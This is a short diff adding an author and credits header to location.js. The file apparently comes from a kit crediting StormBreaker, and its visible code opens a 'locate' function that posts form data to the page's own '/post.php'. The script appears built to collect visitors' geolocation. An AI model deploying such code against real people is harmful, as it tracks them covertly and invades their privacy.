@@ -1,3 +1,11 @@
+// location.js by KasRoudra
+// Author   : KasRoudra
+// Github   : https://github.com/KasRoudra
+// Email    : kasroudrard@gmail.com
+// Messenger: https//m.me/KasRoudra
+// Credits  : StormBreaker(https://github.com/ultrasecurity/Storm-Breaker)
+// CreatedAt: 10-08-2022
+
 const locate = (allow_redir) => {
     // post object as formdata
     const post = (obj, url=window.location.origin+"/post.php", error=false) => {
